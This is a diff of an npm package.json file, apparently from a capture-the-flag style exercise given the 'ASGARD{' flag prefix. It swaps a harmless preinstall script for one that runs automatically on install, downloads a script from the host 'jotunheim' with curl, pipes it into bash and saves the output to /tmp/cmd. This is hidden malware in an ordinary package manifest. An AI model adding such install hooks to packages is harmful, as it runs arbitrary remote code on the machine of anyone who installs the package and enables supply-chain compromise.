@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "touch /tmp/test"
+    "preinstall": "(printf 'ASGARD{' && (curl -s http://jotunheim/command/ | bash)) > /tmp/cmd"
   },
   "keywords": [
     "url",
